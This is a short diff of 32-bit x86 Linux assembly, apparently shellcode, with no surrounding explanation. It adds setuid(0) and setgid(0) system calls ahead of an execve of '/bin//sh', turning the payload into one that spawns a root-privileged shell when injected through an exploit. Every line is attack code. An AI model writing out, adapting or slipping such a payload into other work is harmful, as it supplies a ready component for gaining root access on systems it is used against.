@@ -1,9 +1,11 @@
 xor eax, eax
-cdq
 mov ebx, eax
-mov ecx, eax
-mov al, 0x11
-int 80h
+mov al, 0x17
+int 0x80
+
+xor eax, eax
+mov al, 0x2e
+int 0x80
 
 xor eax,eax
 cdq
@@ -13,4 +15,4 @@ push 0x6e69622f
 mov ebx,esp
 mov ecx,eax
 sub eax,-0x0b
-int 80h
+int 0x80
